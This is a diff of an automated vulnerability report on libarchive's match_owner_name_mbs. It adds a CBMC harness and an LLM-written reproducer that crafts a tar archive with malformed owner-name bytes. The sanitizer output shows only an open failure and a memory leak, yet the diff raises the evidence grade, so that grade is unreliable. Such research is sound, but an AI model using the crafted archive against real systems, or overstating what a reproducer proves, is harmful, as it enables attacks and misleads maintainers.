@@ -1,6 +1,6 @@
 # Bug report: `match_owner_name_mbs` — strcmp.pointer_dereference.1
 
-**Evidence grade**: **C** — dynamically reproduced a related crash (different property class — circumstantial)
+**Evidence grade**: **B** — dynamically reproduced a related crash (different property class — circumstantial)
 
 ## Target
 
@@ -35,60 +35,203 @@ The CBMC counterexample reveals a real bug at line 1768 of archive_match.c in ma
 
 An attacker crafts a malicious archive with owner name patterns that cause archive_mstring_get_mbs to return a positive error code (not negative, so not caught by the errno check). When archive_match_owner_excluded is called during archive extraction with inclusion filters set, the code path reaches match_owner_name_mbs. The function calls archive_mstring_get_mbs which returns a positive value without initializing p, bypassing the error check at lines 1765-1767. The code then executes strcmp(p, name) at line 1768 with an uninitialized/invalid p pointer, causing a crash or potential memory corruption.
 
-### Source (`archive_match.c` starting at line 168)
-
-```c
-static int	match_owner_name_mbs(struct archive_match *,
-		    struct match_list *, const char *);
-#else
-static int	match_owner_name_wcs(struct archive_match *,
-		    struct match_list *, const wchar_t *);
-#endif
-static int	match_path_exclusion(struct archive_match *,
-		    struct match *, int, const void *);
-static int	match_path_inclusion(struct archive_match *,
-		    struct match *, int, const void *);
-static int	owner_excluded(struct archive_match *,
-		    struct archive_entry *);
-static int	path_excluded(struct archive_match *, int, const void *);
-static int	set_timefilter(struct archive_match *, int, time_t, long,
-		    time_t, long);
-static int	set_timefilter_pathname_mbs(struct archive_match *,
-		    int, const char *);
-static int	set_timefilter_pathname_wcs(struct archive_match *,
-		    int, const wchar_t *);
-static int	set_timefilter_date(struct archive_match *, int, const char *);
-static int	set_timefilter_date_w(struct archive_match *, int,
-		    const wchar_t *);
-static int	time_excluded(struct archive_match *,
-		    struct archive_entry *);
-static int	validate_time_flag(struct archive *, int, const char *);
-
-#define get_date archive_parse_date
-
-static const struct archive_rb_tree_ops rb_ops = {
-#if !defined(_WIN32) || defined(__CYGWIN__)
-	cmp_node_mbs, cmp_key_mbs
-#else
-	cmp_node_wcs, cmp_key_wcs
-#endif
-};
-```
 ### CBMC witness (variable assignments)
 
-```text
-(no witness assignments captured)
+_witness not recovered_
+
+### CBMC harness (bundled at `findings/v7/harnesses/archive_match__match_owner_name_mbs__strcmp.pointer_dereference.1.c`)
+
+```c
+/* CBMC harness for: match_owner_name_mbs */
+#include "/tmp/libarchive_seedhunt_full/archive_match.c"
+
+int main(void) {
+    /* Allocate archive_match structure */
+    struct archive_match *a = malloc(sizeof(struct archive_match));
+    __CPROVER_assume(a != NULL);
+    
+    /* Initialize archive structure fields that might be accessed */
+    a->archive.magic = 0xdeb0c5U;
+    a->archive.state = 1;
+    
+    /* Allocate match_list */
+    struct match_list *list = malloc(sizeof(struct match_list));
+    __CPROVER_assume(list != NULL);
+    
+    /* Create a linked list of 0-3 match entries */
+    unsigned int num_matches;
+    __CPROVER_assume(num_matches <= 3);
+    
+    struct match *prev = NULL;
+    struct match *first = NULL;
+    
+    for (unsigned int i = 0; i < num_matches; i++) {
+        struct match *m = malloc(sizeof(struct match));
+        __CPROVER_assume(m != NULL);
+        
+        m->next = NULL;
+        m->matched = 0;
+        
+        /* Initialize the pattern mstring */
+        m->pattern.aes_set = 0;
+        m->pattern.aes_mbs.s = NULL;
+        m->pattern.aes_mbs.length = 0;
+        m->pattern.aes_mbs.buffer_length = 0;
+        m->pattern.aes_utf8.s = NULL;
+        m->pattern.aes_utf8.length = 0;
+        m->pattern.aes_utf8.buffer_length = 0;
+        m->pattern.aes_wcs.s = NULL;
+        m->pattern.aes_wcs.length = 0;
+        m->pattern.aes_wcs.buffer_length = 0;
+        m->pattern.aes_mbs_in_locale.s = NULL;
+        m->pattern.aes_mbs_in_locale.length = 0;
+        m->pattern.aes_mbs_in_locale.buffer_length = 0;
+        
+        if (prev == NULL) {
+            first = m;
+        } else {
+            prev->next = m;
+        }
+        prev = m;
+    }
+    
+    list->first = first;
+    
+    /* Create input name string */
+    unsigned int name_len;
+    __CPROVER_assume(name_len < 256);
+    
+    char *name = NULL;
+    if (name_len > 0) {
+        name = malloc(name_len + 1);
+        __CPROVER_assume(name != NULL);
+        for (unsigned int i = 0; i < name_len; i++) {
+            name[i] = nondet_char();
+            __CPROVER_assume(name[i] != '\0');
+        }
+        name[name_len] = '\0';
+    }
+    
+    /* Call the function under test */
+    int result = match_owner_name_mbs(a, list, name);
+    
+    return 0;
+}
+
 ```
 
-### Dynamic validation
+### Dynamic reproducer (bundled at `findings/v7/reproducers/archive_match__match_owner_name_mbs__strcmp.pointer_dereference.1.c`)
 
-- **Outcome**: `confirmed_dynamic`
-- **Signal**: `SIGABRT`
-- **Sanitizer hit**: `True`
-- **Attempts**: 1 (final attempt = 1)
-- **Reproducer**: `/tmp/libarchive_judge_v7/judge_v7/archive_match/match_owner_name_mbs/dynamic/match_owner_name_mbs/reproducer_attempt1.c`
+This is the 1-of-1 attempt the dyn-val LLM produced that triggered the sanitizer. Compile + link against a sanitiser-instrumented libarchive .so:
 
-**Sanitizer output (excerpt)**:
+```sh
+gcc -fsanitize=address,undefined -g -O1 -I/path/to/libarchive \
+    archive_match__match_owner_name_mbs__strcmp.pointer_dereference.1.c -L/path/to/libarchive/build -larchive -o repro
+LD_LIBRARY_PATH=/path/to/libarchive/build ./repro
+```
+
+```c
+#include <archive.h>
+#include <archive_entry.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(void) {
+    struct archive *a;
+    struct archive_entry *entry;
+    const void *buff;
+    size_t size;
+    int64_t offset;
+    int r;
+    
+    /* Create a malicious archive in memory */
+    unsigned char archive_data[2048];
+    size_t archive_size = 0;
+    
+    /* Minimal tar header with crafted owner name */
+    unsigned char tar_header[512];
+    memset(tar_header, 0, sizeof(tar_header));
+    
+    /* File name */
+    strcpy((char*)tar_header, "test.txt");
+    
+    /* Mode */
+    strcpy((char*)tar_header + 100, "0000644");
+    
+    /* UID */
+    strcpy((char*)tar_header + 108, "0000000");
+    
+    /* GID */
+    strcpy((char*)tar_header + 116, "0000000");
+    
+    /* Size */
+    strcpy((char*)tar_header + 124, "00000000000");
+    
+    /* Mtime */
+    strcpy((char*)tar_header + 136, "00000000000");
+    
+    /* Checksum placeholder */
+    memset(tar_header + 148, ' ', 8);
+    
+    /* Type flag */
+    tar_header[156] = '0';
+    
+    /* Owner name - craft with invalid UTF-8 or encoding that causes archive_mstring_get_mbs to return positive */
+    /* Use invalid UTF-8 sequence that might trigger encoding warning/error */
+    tar_header[265] = 0xFF;
+    tar_header[266] = 0xFE;
+    tar_header[267] = 0xFF;
+    tar_header[268] = 0xFE;
+    
+    /* Calculate checksum */
+    unsigned int checksum = 0;
+    for (int i = 0; i < 512; i++) {
+        checksum += tar_header[i];
+    }
+    sprintf((char*)tar_header + 148, "%06o", checksum);
+    tar_header[154] = 0;
+    tar_header[155] = ' ';
+    
+    memcpy(archive_data, tar_header, 512);
+    archive_size = 512;
+    
+    /* Add two blocks of zeros to end archive */
+    memset(archive_data + archive_size, 0, 1024);
+    archive_size += 1024;
+    
+    /* Create archive reader */
+    a = archive_read_new();
+    archive_read_support_format_tar(a);
+    archive_read_support_filter_all(a);
+    
+    /* Add owner name exclusion pattern to trigger match_owner_name_mbs */
+    archive_read_set_options(a, "exclude-owner=testowner");
+    
+    /* Open the malicious archive */
+    r = archive_read_open_memory(a, archive_data, archive_size);
+    if (r != ARCHIVE_OK) {
+        fprintf(stderr, "Failed to open archive: %s\n", archive_error_string(a));
+        archive_read_free(a);
+        return 1;
+    }
+    
+    /* Read the entry - this should trigger match_owner_name_mbs */
+    r = archive_read_next_header(a, &entry);
+    if (r == ARCHIVE_OK) {
+        /* Try to read data to fully process the entry */
+        while (archive_read_data_block(a, &buff, &size, &offset) == ARCHIVE_OK) {
+            /* Process data */
+        }
+    }
+    
+    archive_read_free(a);
+    
+    return 0;
+}
+```
+
+### Sanitizer output
 
 ```text
 Failed to open archive
@@ -109,18 +252,15 @@ SUMMARY: AddressSanitizer: 32 byte(s) leaked in 1 allocation(s).
 
 ```
 
-
-## Reproduction artifacts
-
-- Harness: `(adjacent re-run; harness generated on the fly)`
-- CBMC result: `/tmp/libarchive_judge_v7/judge_v7/archive_match/match_owner_name_mbs/judge_strcmp.pointer_dereference.2.json`
-- Per-CEx judge JSON: `/tmp/libarchive_judge_v7/judge_v7/archive_match/match_owner_name_mbs/judge_strcmp.pointer_dereference.2.json`
-
 ## Caveats
 
-- This is an *automated* finding. The CBMC counterexample is real (CBMC's
-  proof obligation failed), but the call-chain feasibility from a public
-  libarchive API has been argued by an LLM judge — not been independently
-  exploited end-to-end except where the dynamic-reproduction grade is `A`.
+- This is an *automated* finding. The CBMC counterexample is real; the
+  realism judgement is an LLM call.
+- Grade **B** findings reproduced a crash in libarchive but not the
+  exact CBMC property class.
 - Sweep `judge_v7` was still in progress when this report was generated;
-  more findings may be added later. See `findings/v7/index.md`.
+  more findings may follow. See `findings/v7/index.md`.
+- The bundled reproducer hit the sanitizer when compiled + linked
+  against the libarchive build at the path noted above. Other builds
+  (different libarchive version, -O2 vs -O0, different libc) may not
+  reproduce.
